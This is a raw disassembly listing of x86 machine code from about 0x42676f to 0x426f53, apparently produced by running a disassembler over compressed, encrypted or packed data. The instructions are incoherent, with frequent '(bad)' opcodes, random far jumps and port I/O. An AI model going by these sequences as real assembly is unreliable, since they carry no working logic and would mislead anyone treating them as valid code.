  42676f:	mov    cl,0x3d
  426771:	and    BYTE PTR [edi],bl
  426773:	(bad)  
  426774:	stos   DWORD PTR es:[edi],eax
  426775:	mov    esi,0xbb3c141b
  42677a:	add    dh,BYTE PTR [edi-0xd645a00]
  426780:	lea    edx,[edi]
  426782:	mov    ebx,0x8570e1a1
  426787:	test   BYTE PTR [ebx],cl
  426789:	jo     0x4267fb
  42678b:	fwait
  42678c:	ins    BYTE PTR es:[edi],dx
  42678d:	inc    ebx
  42678e:	adc    BYTE PTR ds:0x986cca40,cl
  426794:	push   0xffffff9b
  426796:	test   DWORD PTR [edi-0x70ec95d3],ecx
  42679c:	popf   
  42679d:	jmp    0x426810
  42679f:	arpl   dx,si
  4267a1:	ja     0x42677f
  4267a3:	cld    
  4267a4:	daa    
  4267a5:	mov    bl,0xae
  4267a7:	ja     0x42677c
  4267a9:	add    DWORD PTR [edi-0x787b9382],edx
  4267af:	and    BYTE PTR es:[ebx+0x227a4e9c],ah
  4267b6:	ja     0x4267af
  4267b8:	push   0x3b15989d
  4267bd:	nop
  4267be:	in     al,0x9c
  4267c0:	sti    
  4267c1:	push   ss
  4267c2:	jle    0x426818
  4267c4:	add    ebx,ebx
  4267c6:	jno    0x42681f
  4267c8:	dec    eax
  4267c9:	ficomp WORD PTR [edx+edx*1+0x46]
  4267cd:	in     eax,0xcd
  4267cf:	stos   DWORD PTR es:[edi],eax
  4267d0:	sbb    BYTE PTR [ebx-0x61b0a966],ah
  4267d6:	gs inc esp
  4267d8:	stos   DWORD PTR es:[edi],eax
  4267d9:	or     al,BYTE PTR [edi]
  4267db:	pushf  
  4267dc:	mov    dl,0x42
  4267de:	pusha  
  4267df:	jbe    0x426789
  4267e1:	in     al,0x24
  4267e3:	lahf   
  4267e4:	int    0x99
  4267e6:	loop   0x42684b
  4267e8:	int3   
  4267e9:	aas    
  4267ea:	adc    al,0xc7
  4267ec:	ds repz (bad) 
  4267f2:	jae    0x4267ce
  4267f4:	jne    0x42680f
  4267f6:	rol    BYTE PTR [edx+0x33],1
  4267f9:	sbb    ebx,ecx
  4267fb:	call   0xa9130ed
  426800:	lock repnz dec edx
  426803:	mov    dh,ch
  426805:	stc    
  426806:	sbb    eax,0xe380bda1
  42680b:	xchg   edx,eax
  42680c:	inc    eax
  42680d:	(bad)
  426810:	mov    cs,esi
  426812:	inc    eax
  426813:	inc    ebx
  426814:	sahf   
  426815:	inc    ebp
  426816:	retf   0x53dd
  426819:	clc    
  42681a:	call   0x542c:0x6bf206ab
  426821:	jne    0x42684f
  426823:	loope  0x42682e
  426825:	icebp  
  426826:	leave  
  426827:	dec    ebx
  426828:	arpl   WORD PTR [ecx+0x68],dx
  42682b:	sub    ah,BYTE PTR [esi+0x5159c865]
  426831:	lock loope 0x4267f2
  426834:	rcr    DWORD PTR [ebx+0x42],0x46
  426838:	push   ebp
  426839:	loope  0x426894
  42683b:	retf   
  42683c:	out    dx,al
  42683d:	jne    0x42683e
  42683f:	and    ah,ah
  426841:	pop    eax
  426842:	in     eax,0x53
  426844:	mov    dh,0x83
  426846:	xchg   ebp,eax
  426847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426848:	ficom  DWORD PTR [edi]
  42684a:	cmp    eax,0x2ca46b16
  42684f:	xchg   BYTE PTR [ecx],dl
  426851:	fnstcw WORD PTR [eax+edi*4]
  426854:	mov    al,0x4c
  426856:	jl     0x426841
  426858:	push   cs
  426859:	aam    0xb7
  42685b:	sub    edi,esp
  42685d:	ret    
  42685e:	shl    DWORD PTR [ecx+0x75],0x49
  426862:	add    al,BYTE PTR [esi-0xa]
  426865:	test   edi,esi
  426867:	jo     0x42686a
  426869:	mov    ebx,0xe2300d2f
  42686e:	or     BYTE PTR [ecx+edx*8],cl
  426871:	pop    ecx
  426873:	dec    edx
  426874:	jo     0x42683e
  426876:	cmp    al,0x52
  426878:	mov    bl,dh
  42687a:	dec    ebp
  42687b:	jbe    0x4268bd
  42687d:	sub    DWORD PTR [eax+0x1],eax
  426880:	retf   0xc7
  426883:	and    al,0x6d
  426885:	adc    al,0xfc
  426887:	jne    0x42681c
  426889:	(bad)  
  42688a:	pop    ss
  42688b:	test   eax,0x395f5f87
  426890:	(bad)  
  426893:	inc    esi
  426894:	push   cs
  426895:	sbb    ebx,DWORD PTR [ebp+0x5b]
  426898:	xchg   ecx,eax
  426899:	arpl   WORD PTR es:0x1fb59da,dx
  4268a0:	cmp    esp,DWORD PTR [edx+0x22766aef]
  4268a6:	add    DWORD PTR [ebx+0x15eacad4],edx
  4268ac:	xor    edi,DWORD PTR ds:[esi-0x72]
  4268b0:	dec    edi
  4268b1:	sbb    eax,0xa706c93f
  4268b6:	out    0x14,eax
  4268b8:	test   BYTE PTR [esi-0x1a83d042],bl
  4268be:	mov    esi,0xb314ca0c
  4268c3:	mov    dl,0xfd
  4268c5:	ja     0x42692c
  4268c7:	test   DWORD PTR [esi],ebp
  4268c9:	hlt    
  4268ca:	jmp    0xbeef97f4
  4268cf:	pushf  
  4268d0:	scas   eax,DWORD PTR es:[edi]
  4268d1:	cmc    
  4268d2:	inc    esi
  4268d3:	aad    0x25
  4268d5:	in     eax,dx
  4268d6:	push   es
  4268d7:	sahf   
  4268d8:	fdivr  st(2),st
  4268da:	xor    ebx,esp
  4268dc:	adc    eax,0xc112d61d
  4268e1:	xor    al,0x13
  4268e3:	call   0x1b2e:0x8e75f893
  4268ea:	sub    BYTE PTR [edi-0x4b350939],dl
  4268f0:	xlat   BYTE PTR ds:[ebx]
  4268f1:	sub    ah,BYTE PTR [ecx+0x431582f5]
  4268f7:	(bad)  
  4268f8:	in     eax,dx
  4268f9:	ret    
  4268fa:	push   ss
  4268fb:	test   eax,0x47c5976a
  426900:	dec    eax
  426901:	cdq    
  426902:	fs adc ch,0xa8
  426906:	mov    ebx,0x9ba7824d
  42690b:	adc    bl,bl
  42690d:	pusha  
  42690e:	lahf   
  42690f:	mov    bl,BYTE PTR ds:0x739630c
  426915:	pop    es
  426916:	push   ebx
  426917:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426918:	add    edx,ebp
  42691a:	es mov ch,0xe5
  42691d:	arpl   WORD PTR [ecx],si
  42691f:	or     eax,0xf2b43448
  426924:	xor    esi,DWORD PTR [edx]
  426926:	stos   DWORD PTR es:[edi],eax
  426927:	stos   BYTE PTR es:[edi],al
  426928:	bound  ebp,QWORD PTR [edx+ebp*4-0x4d8ec6c0]
  42692f:	inc    eax
  426930:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426931:	or     al,0xa
  426933:	adc    DWORD PTR [edx-0x21bbebab],esi
  426939:	pop    eax
  42693a:	call   0xd34b:0xe5e44c1e
  426941:	int3   
  426942:	push   edx
  426943:	push   ebx
  426944:	je     0x426937
  426946:	dec    ebp
  426947:	and    BYTE PTR [edi+0x64fac5ca],cl
  42694d:	cmp    al,0x25
  42694f:	sti    
  426950:	daa    
  426951:	jle    0x4269b6
  426953:	mov    eax,ds:0x8c8d3d2a
  426958:	push   eax
  426959:	mov    esp,0xd10cfee3
  42695e:	mul    BYTE PTR [ebx+0x29]
  426961:	mov    edi,0x6d02a963
  426966:	sub    DWORD PTR [edx+0x46],esp
  426969:	std    
  42696a:	push   ecx
  42696b:	pop    edi
  42696c:	push   0xb81825d0
  426971:	fs add edx,ecx
  426974:	push   ss
  426975:	inc    esi
  426976:	push   ds
  426977:	lahf   
  426978:	clc    
  426979:	mov    ecx,0xa32c2600
  42697e:	xchg   esi,eax
  42697f:	pop    ebx
  426980:	enter  0xcc9a,0x3d
  426984:	out    0xd,eax
  426986:	mov    al,ds:0xa64e823d
  42698b:	xchg   edx,eax
  42698c:	repz and DWORD PTR [ecx],ebx
  42698f:	sahf   
  426990:	jl     0x42695c
  426992:	mov    eax,ds:0x21fbddc
  426997:	mov    al,0x9e
  426999:	push   0xb
  42699b:	sbb    BYTE PTR [eax+esi*1-0x51],0xe
  4269a0:	sbb    BYTE PTR [ebp-0x4e],cl
  4269a3:	mov    ds:0x3d1a8818,eax
  4269a8:	jg     0x426a02
  4269aa:	sbb    bh,BYTE PTR [ebx-0x665c5573]
  4269b0:	sbb    BYTE PTR [ecx],dl
  4269b2:	xchg   edx,eax
  4269b3:	jne    0x4269b5
  4269b5:	out    0xeb,al
  4269b7:	cmp    edx,DWORD PTR [edi+0x5f]
  4269ba:	das    
  4269bb:	rcl    BYTE PTR [edi],0x4
  4269be:	xor    cl,BYTE PTR ds:0xec37f185
  4269c4:	imul   ecx,DWORD PTR [edi-0x33443bf8],0xea776ac7
  4269ce:	aam    0x23
  4269d0:	sbb    BYTE PTR [ebp-0x9],bl
  4269d3:	mov    gs,WORD PTR [edi]
  4269d5:	retf   0xac36
  4269d8:	pop    ebx
  4269d9:	or     edi,DWORD PTR [ecx-0x42]
  4269dc:	jbe    0x4269f2
  4269de:	test   BYTE PTR [edi+0x4],0x65
  4269e2:	(bad)  
  4269e3:	adc    ah,dl
  4269e5:	(bad)  
  4269e6:	xchg   esp,eax
  4269e7:	stos   DWORD PTR es:[edi],eax
  4269e8:	daa    
  4269e9:	ret    0x1372
  4269ec:	and    dl,dl
  4269ee:	outs   dx,DWORD PTR ds:[esi]
  4269ef:	cmp    dh,BYTE PTR [ebx-0x7e]
  4269f2:	dec    ecx
  4269f3:	loope  0x4269c4
  4269f5:	je     0x4269f6
  4269f7:	leave  
  4269f8:	(bad)  
  4269fa:	jle    0x4269a4
  4269fc:	sbb    al,BYTE PTR [eax-0x52]
  4269ff:	push   ebp
  426a00:	jno    0x4269b9
  426a02:	and    cl,ah
  426a04:	inc    edx
  426a05:	cmp    eax,0x826230c0
  426a0a:	push   cs
  426a0b:	lea    ecx,[edx]
  426a0d:	into   
  426a0e:	(bad)  
  426a0f:	loop   0x4269d9
  426a11:	adc    eax,0xece1a664
  426a16:	cmp    BYTE PTR [edx],cl
  426a18:	fwait
  426a19:	push   eax
  426a1a:	mov    ecx,0x47246ad9
  426a1f:	sbb    eax,DWORD PTR [eax]
  426a21:	or     eax,eax
  426a23:	push   esp
  426a24:	and    eax,0xc12f0da3
  426a29:	mov    eax,ds:0x8d699934
  426a2e:	mov    ds:0x3f38bf56,al
  426a33:	adc    eax,0x71af26b6
  426a38:	sub    bh,bl
  426a3a:	sbb    al,0xc0
  426a3c:	push   0xa5959da9
  426a41:	arpl   WORD PTR [ecx-0x6c55c4ab],si
  426a47:	int3   
  426a48:	cdq    
  426a49:	loopne 0x4269e0
  426a4b:	mov    ch,0x3f
  426a4d:	mov    cl,al
  426a4f:	push   eax
  426a50:	(bad)  
  426a52:	aad    0x7
  426a54:	xor    DWORD PTR [ebp+0x3f],esp
  426a57:	pop    es
  426a58:	push   0x18f71c15
  426a5d:	sub    DWORD PTR [ecx],edx
  426a5f:	rcl    DWORD PTR [edx+0x2f],1
  426a62:	cmp    BYTE PTR [eax-0x4c],0x3
  426a66:	out    dx,al
  426a67:	mov    ebp,DWORD PTR [esp+edx*1+0x39]
  426a6b:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  426a6d:	mov    edi,0x80d419e6
  426a72:	mov    bh,0x67
  426a74:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426a75:	mov    dl,0x54
  426a77:	sub    al,0xb0
  426a79:	out    dx,al
  426a7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426a7b:	cld    
  426a7c:	dec    esp
  426a7d:	or     ecx,edi
  426a7f:	jnp    0x426a2e
  426a81:	add    BYTE PTR [ebp+0x37f05147],dl
  426a87:	mov    cl,0xa5
  426a89:	sbb    BYTE PTR gs:[ebx+0x3e],0x90
  426a8e:	hlt    
  426a8f:	iret   
  426a90:	outs   dx,BYTE PTR ds:[esi]
  426a91:	adc    al,0xaa
  426a93:	jle    0x426a50
  426a95:	outs   dx,DWORD PTR ds:[esi]
  426a96:	fdivr  DWORD PTR [ebx-0x7b]
  426a99:	mov    ds:0x572da6f7,al
  426a9e:	jge    0x426a8a
  426aa0:	sub    BYTE PTR [esi-0x86c14fa],0x6a
  426aa7:	out    dx,eax
  426aa8:	into   
  426aa9:	and    edi,edi
  426aab:	pop    edi
  426aac:	sar    DWORD PTR [eax-0x38f1608],cl
  426ab2:	icebp  
  426ab3:	(bad)  
  426ab4:	xor    DWORD PTR [ebp+ebx*4-0x6f],edi
  426ab8:	imul   edi,ecx,0x8b73e2ca
  426abe:	add    dl,bh
  426ac0:	push   es
  426ac1:	pop    eax
  426ac2:	(bad)  
  426ac3:	fadd   QWORD PTR ds:0x4208a09d
  426ac9:	adc    eax,0x1b42a3e2
  426ace:	xchg   ebp,eax
  426acf:	sub    al,BYTE PTR [edx+0x26]
  426ad2:	sub    al,0xb2
  426ad4:	and    al,0x72
  426ad6:	scas   eax,DWORD PTR es:[edi]
  426ad7:	pop    edi
  426ad8:	pop    ecx
  426ad9:	fs ss xchg ebx,eax
  426adc:	push   ebp
  426add:	fwait
  426ade:	xchg   BYTE PTR [eax+0x50],dl
  426ae1:	mov    ds,WORD PTR [ebx+edi*1-0x46]
  426ae5:	adc    BYTE PTR [edx-0x112661d6],dh
  426aeb:	sub    BYTE PTR [ebx+ebp*8],dh
  426aee:	lods   al,BYTE PTR ds:[esi]
  426aef:	and    eax,0x4e15094f
  426af4:	inc    edx
  426af5:	dec    edi
  426af6:	push   ss
  426af7:	jmp    0x426acc
  426af9:	sbb    BYTE PTR ds:0x7de37b22,dl
  426aff:	jp     0x426a87
  426b01:	(bad)  
  426b03:	dec    eax
  426b04:	test   ah,dh
  426b06:	dec    ebp
  426b07:	mov    eax,ds:0xabd45d76
  426b0c:	cmp    edx,DWORD PTR [ecx+0x4af63ee7]
  426b12:	(bad)  
  426b13:	xor    eax,0x488e6162
  426b18:	retf   0x8d41
  426b1b:	add    eax,0x7269a804
  426b20:	inc    ebx
  426b21:	out    0x5f,al
  426b23:	in     al,dx
  426b24:	mov    ds:0xcfc5faf9,eax
  426b29:	loope  0x426b9c
  426b2b:	loope  0x426abc
  426b2d:	pop    ds
  426b2e:	mov    bh,0xc8
  426b30:	push   ecx
  426b31:	mov    edi,0xfcb28038
  426b36:	mov    ah,0x87
  426b38:	cmp    bh,BYTE PTR [ecx+ecx*8+0x28]
  426b3c:	aas    
  426b3d:	faddp  st(0),st
  426b3f:	dec    edx
  426b40:	rol    BYTE PTR [ebx+ecx*8],cl
  426b43:	push   0xffffffe2
  426b45:	cs fs fcmovnbe st,st(5)
  426b49:	cmp    DWORD PTR [edx+eax*4-0x634a2391],esp
  426b50:	leave  
  426b51:	adc    eax,0xe6fc6e85
  426b56:	jnp    0x426baa
  426b58:	mov    esi,DWORD PTR [ebp+eiz*2+0x70]
  426b5c:	add    al,0x7a
  426b5e:	gs leave 
  426b60:	shl    DWORD PTR [eax-0x29d777b9],cl
  426b66:	arpl   dx,ax
  426b68:	xchg   BYTE PTR [edi],ch
  426b6a:	shr    DWORD PTR [ecx],cl
  426b6c:	xchg   esp,eax
  426b6d:	clc    
  426b6e:	push   ebp
  426b6f:	ret    
  426b70:	jbe    0x426bc8
  426b72:	inc    ebx
  426b73:	rcl    DWORD PTR [edx+0x428a17e7],1
  426b79:	les    esp,FWORD PTR [ecx-0x71]
  426b7c:	jne    0x426b48
  426b7e:	dec    eax
  426b7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426b80:	push   es
  426b81:	xor    eax,0x9cb2c631
  426b86:	ret    0x6c3e
  426b89:	ret    
  426b8a:	cmp    ecx,ecx
  426b8c:	jge    0x426b2e
  426b8e:	aaa    
  426b8f:	cmc    
  426b90:	and    DWORD PTR ds:0x68c67e1c,esi
  426b96:	or     al,BYTE PTR [esp+edx*2]
  426b99:	popa   
  426b9a:	call   0x7c18:0x651631d7
  426ba1:	loopne 0x426b64
  426ba3:	pop    esi
  426ba4:	(bad)  
  426ba5:	push   0x64
  426ba7:	xor    edx,DWORD PTR [ebp+0x51]
  426baa:	js     0x426bef
  426bac:	or     edx,DWORD PTR [ebx]
  426bae:	(bad)  
  426baf:	test   al,0x0
  426bb1:	jmp    0xc55e:0x1cb94696
  426bb8:	fcmovnb st,st(2)
  426bba:	fwait
  426bbb:	lock popa 
  426bbd:	mov    ebx,0xa0e5d7d4
  426bc2:	bsf    eax,DWORD PTR [ecx]
  426bc5:	in     eax,0xb7
  426bc7:	xchg   DWORD PTR [ebp-0x17],ebp
  426bca:	cld    
  426bcb:	jp     0x426c0c
  426bcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426bce:	std    
  426bcf:	(bad)  
  426bd0:	iret   
  426bd1:	push   ds
  426bd2:	bnd jp 0x426c25
  426bd5:	imul   eax,DWORD PTR [eax],0xffffffce
  426bd8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426bd9:	xchg   edx,eax
  426bda:	in     al,dx
  426bdb:	loope  0x426ba9
  426bdd:	xor    ebp,DWORD PTR [edx+ecx*1]
  426be0:	jecxz  0x426b6a
  426be2:	scas   al,BYTE PTR es:[edi]
  426be3:	jnp    0x426ba4
  426be5:	nop
  426be6:	pop    edi
  426be7:	(bad)  
  426be8:	push   ebp
  426be9:	rcr    DWORD PTR [ebx-0x71489086],1
  426bef:	cmp    BYTE PTR [edx+0x69],al
  426bf2:	dec    esp
  426bf3:	push   eax
  426bf4:	std    
  426bf5:	jg     0x426bd2
  426bf7:	ins    DWORD PTR es:[edi],dx
  426bf8:	mov    ds:0xc6a11fe7,eax
  426bfd:	jle    0x426c55
  426bff:	mov    cl,0xd6
  426c01:	imul   edx,DWORD PTR [edx+ebx*4],0x32
  426c05:	sub    DWORD PTR [eax+ecx*4],ebx
  426c08:	dec    edi
  426c09:	loop   0x426c34
  426c0b:	nop
  426c0c:	(bad)  
  426c0d:	sti    
  426c0e:	aad    0xf2
  426c10:	or     ebx,DWORD PTR [ebp+0xe8150c9]
  426c16:	inc    eax
  426c17:	fs retf 
  426c19:	iret   
  426c1a:	push   ebx
  426c1b:	ret    
  426c1c:	pop    ecx
  426c1d:	or     al,0x8b
  426c1f:	xchg   ecx,eax
  426c20:	pop    ebp
  426c21:	push   ebp
  426c22:	pop    edi
  426c23:	sbb    DWORD PTR [eax],0xa905d7b0
  426c29:	lods   al,BYTE PTR ds:[esi]
  426c2a:	stc    
  426c2b:	or     eax,0x55d261a1
  426c30:	mov    cl,0x69
  426c32:	sbb    ebp,DWORD PTR [edx]
  426c34:	mov    BYTE PTR [ebx],ah
  426c36:	jb     0x426c54
  426c38:	mov    ds:0xf2f47b84,eax
  426c3d:	es aam 0xfe
  426c40:	adc    BYTE PTR [esi-0x3b],dh
  426c43:	in     eax,0x10
  426c45:	push   esi
  426c46:	cmp    BYTE PTR [ebp+0x23398403],dh
  426c4c:	jp     0x426c0a
  426c4e:	xlat   BYTE PTR ds:[ebx]
  426c4f:	cs int3 
  426c51:	pushf  
  426c52:	iret   
  426c53:	hlt    
  426c54:	out    dx,eax
  426c55:	ins    DWORD PTR es:[edi],dx
  426c56:	in     al,0x61
  426c58:	in     al,dx
  426c59:	push   eax
  426c5a:	mov    dh,0x15
  426c5c:	xchg   esp,eax
  426c5d:	enter  0xfed3,0x62
  426c61:	sub    BYTE PTR [esi-0xd4a63a6],dl
  426c67:	dec    edx
  426c68:	retf   0xfee8
  426c6b:	mov    WORD PTR [esi+0x10],ds
  426c6e:	xlat   BYTE PTR ds:[ebx]
  426c6f:	push   edx
  426c70:	jp     0x426ca9
  426c72:	int3   
  426c73:	call   0xe322c183
  426c78:	jle    0x426c9e
  426c7a:	es fcmovnu st,st(7)
  426c7d:	cmp    eax,0xec66ad05
  426c82:	add    edi,DWORD PTR [ebp+0x6b]
  426c85:	sub    al,0x98
  426c87:	popf   
  426c88:	mov    bh,0xfe
  426c8a:	enter  0xc942,0xfd
  426c8e:	add    eax,0x9538deb6
  426c93:	mov    ds:0x5f2a4f57,al
  426c98:	inc    ebp
  426c99:	add    eax,0xcb3de8bd
  426c9e:	or     DWORD PTR [esi],0x8c3edb56
  426ca4:	sub    ebx,ecx
  426ca6:	jmp    0x3f628ac7
  426cab:	adc    esp,ecx
  426cad:	push   0xb60c0f0e
  426cb2:	add    dh,bl
  426cb4:	iret   
  426cb5:	adc    al,0xf6
  426cb7:	inc    eax
  426cb8:	(bad)  
  426cba:	adc    ah,BYTE PTR [ecx]
  426cbc:	jmp    0x426ce9
  426cbe:	add    eax,edi
  426cc0:	mov    ebx,0x1e40c0d7
  426cc5:	xor    BYTE PTR [ebp-0x4],bl
  426cc8:	out    0x42,al
  426cca:	cwde   
  426ccb:	adc    ch,dl
  426ccd:	pop    ebx
  426cce:	cli    
  426ccf:	mov    ebp,0x67f5c38d
  426cd4:	mov    cl,0xbe
  426cd6:	fdivr  st(5),st
  426cd8:	push   edx
  426cd9:	pop    edi
  426cda:	mov    ecx,0x16276e51
  426cdf:	jo     0x426c9a
  426ce1:	fcom   DWORD PTR [edx]
  426ce3:	in     eax,0xeb
  426ce5:	push   0x49d0dcc1
  426cea:	ins    BYTE PTR es:[edi],dx
  426ceb:	mov    ds:0x73c1a5fa,eax
  426cf0:	push   edx
  426cf1:	pop    ebx
  426cf2:	in     eax,0xb8
  426cf4:	inc    eax
  426cf5:	and    al,0x30
  426cf7:	add    al,0x90
  426cf9:	sub    DWORD PTR [eax-0x67],ecx
  426cfc:	test   al,0x7d
  426cfe:	ds add eax,0x6714b837
  426d04:	ret    
  426d05:	or     bl,ch
  426d07:	dec    ecx
  426d08:	loopne 0x426cdf
  426d0a:	jmp    0x7d28:0x9e3fdfa7
  426d11:	push   0xfffffff1
  426d13:	ror    DWORD PTR [ebp-0x9],0x91
  426d17:	mov    ecx,0xac065ec1
  426d1c:	adc    bl,BYTE PTR [edi-0x4]
  426d1f:	adc    cl,BYTE PTR ds:0x5b16e5c3
  426d25:	sub    eax,0x55262f90
  426d2a:	outs   dx,BYTE PTR ds:[esi]
  426d2b:	cmp    eax,0xdad1992e
  426d30:	xor    DWORD PTR [eax],0xffffffca
  426d33:	or     eax,0xb3ca9846
  426d38:	sub    al,0x40
  426d3a:	paddq  mm2,QWORD PTR ds:0x56d5dbec
  426d41:	sbb    al,0x72
  426d43:	inc    eax
  426d44:	cmp    al,0x73
  426d46:	ret    0xf7ef
  426d49:	pop    esi
  426d4a:	loope  0x426d17
  426d4c:	adc    al,0xab
  426d4e:	mov    eax,edi
  426d50:	cmp    BYTE PTR [ebp+ecx*8-0x58b020df],dl
  426d57:	call   0x1d443d63
  426d5c:	int3   
  426d5d:	xchg   esi,eax
  426d5e:	ss out dx,eax
  426d60:	jecxz  0x426d85
  426d62:	mov    edx,0xb22be22b
  426d67:	mov    al,0xb7
  426d69:	xor    cl,BYTE PTR [eax]
  426d6b:	pusha  
  426d6c:	pop    ds
  426d6d:	mov    esp,0x9187d2a0
  426d72:	mov    eax,ds:0xb5135054
  426d77:	sbb    ebp,edx
  426d79:	mov    ds:0x522583e9,eax
  426d7e:	inc    eax
  426d7f:	push   ebp
  426d80:	inc    eax
  426d81:	scas   eax,DWORD PTR es:[edi]
  426d82:	and    al,bl
  426d84:	cmp    BYTE PTR [edx],0xc1
  426d87:	dec    edx
  426d88:	je     0x426dfa
  426d8a:	push   es
  426d8b:	retf   
  426d8c:	les    edx,FWORD PTR [edx]
  426d8e:	jecxz  0x426df6
  426d90:	sahf   
  426d91:	test   BYTE PTR [edi],ah
  426d93:	mov    ds:0x96f74dac,eax
  426d98:	cwde   
  426d99:	loop   0x426da2
  426d9b:	and    DWORD PTR [esp-0xc7f6880],edi
  426da2:	rol    BYTE PTR [esi+0x6bf945a6],cl
  426da8:	xor    al,0x7a
  426daa:	aaa    
  426dab:	ud2    
  426dad:	loop   0x426dc5
  426daf:	in     al,0x5c
  426db1:	cdq    
  426db2:	sub    edi,DWORD PTR [esi]
  426db4:	gs ins BYTE PTR es:[edi],dx
  426db6:	out    0xcd,al
  426db8:	arpl   WORD PTR [eax-0x54],bx
  426dbb:	repz sbb BYTE PTR [ebp+0x69],al
  426dbf:	and    eax,0x64745d7b
  426dc4:	icebp  
  426dc5:	lods   eax,DWORD PTR ds:[esi]
  426dc6:	adc    ebp,DWORD PTR [ecx+0x2]
  426dc9:	inc    esp
  426dca:	test   eax,0x0
	...
  426de7:	add    BYTE PTR [eax],al
  426de9:	add    BYTE PTR [edi+0x56],al
  426dec:	dec    esp
  426ded:	inc    edx
  426dee:	pop    ebp
  426def:	pop    edx
  426df0:	dec    edi
  426df1:	push   edi
  426df2:	dec    edx
  426df3:	push   es
  426df4:	enter  0x9281,0x6b
  426df8:	mov    eax,0x1f97bc2
  426dfd:	add    BYTE PTR [edi-0xdfffffa],al
  426e03:	les    esp,FWORD PTR [ecx-0x35]
  426e06:	retf   0xcc8a
  426e09:	fstp   DWORD PTR [eax]
  426e0b:	out    dx,eax
  426e0c:	xor    esp,DWORD PTR [edi]
  426e0e:	or     dl,cl
  426e10:	loop   0x426e63
  426e12:	cmc    
  426e13:	(bad)  
  426e14:	cmp    ch,BYTE PTR [eax+ebx*8-0x55]
  426e18:	sar    DWORD PTR [eax-0x69fc5d63],0xbf
  426e1f:	lock inc edx
  426e21:	sbb    DWORD PTR [ebx+0x69],edi
  426e24:	lea    esi,[ebp+0x171f5eef]
  426e2a:	(bad)  
  426e2c:	inc    esp
  426e2d:	or     DWORD PTR [eax+0x43],edx
  426e30:	in     al,0x22
  426e32:	bound  edi,QWORD PTR [ecx+0x74365d4f]
  426e38:	dec    esi
  426e39:	sub    ebx,ecx
  426e3b:	in     al,dx
  426e3c:	push   edx
  426e3d:	ret    
  426e3e:	in     al,dx
  426e3f:	rcl    DWORD PTR [ecx+0xa92afd5],0xad
  426e46:	je     0x426e5f
  426e48:	les    edx,FWORD PTR [eax+ebp*2+0x4b4920be]
  426e4f:	maskmovq mm5,mm7
  426e52:	xchg   BYTE PTR [ecx-0x1c],dl
  426e55:	add    al,0x65
  426e57:	pop    edi
  426e58:	scas   eax,DWORD PTR es:[edi]
  426e59:	dec    ebx
  426e5a:	mov    ebp,0xfae17152
  426e5f:	or     bh,BYTE PTR [esi+0xc]
  426e62:	mov    ss,WORD PTR [ebx-0x1f049cbd]
  426e68:	fild   DWORD PTR [ebx+0x9dc9f67]
  426e6e:	adc    edx,DWORD PTR [ebx+0x656a05d8]
  426e74:	fild   QWORD PTR [ebx]
  426e76:	fcom   QWORD PTR [edi]
  426e78:	jno    0x426e4e
  426e7a:	adc    eax,0xcc18712d
  426e7f:	cmp    eax,0x5ed4e9c7
  426e84:	dec    ebx
  426e85:	xchg   ecx,eax
  426e86:	rol    BYTE PTR [eax],cl
  426e88:	add    ebx,DWORD PTR [esi]
  426e8a:	push   es
  426e8b:	push   ds
  426e8c:	mov    ds:0x8c495b8e,al
  426e91:	adc    eax,0x8bf263dd
  426e96:	sahf   
  426e97:	jae    0x426eab
  426e99:	xor    BYTE PTR [eax-0x5c4dacc8],0x8f
  426ea0:	retf   
  426ea1:	cmc    
  426ea2:	fbld   TBYTE PTR [eax]
  426ea4:	gs jmp 0x426eac
  426ea7:	test   DWORD PTR [ebx-0x3f111d7d],edx
  426ead:	gs popa 
  426eaf:	add    eax,0x53ad2eee
  426eb4:	cli    
  426eb5:	jp     0x426e53
  426eb7:	mov    cl,0x97
  426eb9:	pop    ecx
  426eba:	fimul  DWORD PTR [edx-0x2eea72b7]
  426ec0:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  426ec2:	push   esi
  426ec3:	pop    ebp
  426ec4:	std    
  426ec5:	cld    
  426ec6:	test   BYTE PTR [edx-0x63aa8208],ch
  426ecc:	mov    esp,0xd342cad3
  426ed1:	mov    edx,0x5bbff7a8
  426ed6:	jmp    0xc7da:0x822bbd66
  426edd:	jb     0x426f22
  426edf:	inc    ecx
  426ee0:	pop    ecx
  426ee1:	sti    
  426ee2:	cdq    
  426ee3:	icebp  
  426ee4:	(bad)  
  426ee5:	mov    al,ds:0x1106d1db
  426eea:	nop
  426eeb:	sbb    al,0x21
  426eed:	or     BYTE PTR [edx],0x97
  426ef0:	or     esp,esp
  426ef2:	retf   
  426ef3:	jne    0x426ec8
  426ef5:	sbb    eax,0x67efe395
  426efa:	lds    eax,FWORD PTR [ecx-0x55]
  426efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426efe:	enter  0x827c,0x99
  426f02:	push   edi
  426f03:	cdq    
  426f04:	pop    ds
  426f05:	aas    
  426f06:	icebp  
  426f07:	sbb    ch,BYTE PTR [esi+0x6]
  426f0a:	imul   ecx,DWORD PTR [esi-0x48],0x4fdba591
  426f11:	pop    ebp
  426f12:	xlat   BYTE PTR ds:[ebx]
  426f13:	adc    al,0x68
  426f15:	(bad)  
  426f16:	xlat   BYTE PTR ds:[ebx]
  426f17:	ins    DWORD PTR es:[edi],dx
  426f18:	xlat   BYTE PTR ds:[ebx]
  426f19:	rcr    BYTE PTR [edx+0xd],cl
  426f1c:	and    eax,0xbb5884d4
  426f21:	jns    0x426f33
  426f23:	xor    eax,ecx
  426f25:	mov    edx,DWORD PTR ds:0xbc75d9dd
  426f2b:	out    dx,al
  426f2c:	hlt    
  426f2d:	ror    DWORD PTR [ebx+0x24777d5b],cl
  426f33:	jmp    0xf99b:0xb9ae7f87
  426f3a:	xor    BYTE PTR [ebx+0x7c],al
  426f3d:	lock adc ebp,DWORD PTR [ecx+0x6c]
  426f41:	call   DWORD PTR [ebx+ebp*8-0x5c1797fe]
  426f48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426f49:	mov    bl,0x67
  426f4b:	lds    ebx,FWORD PTR fs:[ebp-0x446f63c5]
  426f52:	in     eax,dx
  426f53:	jg     0x426f90
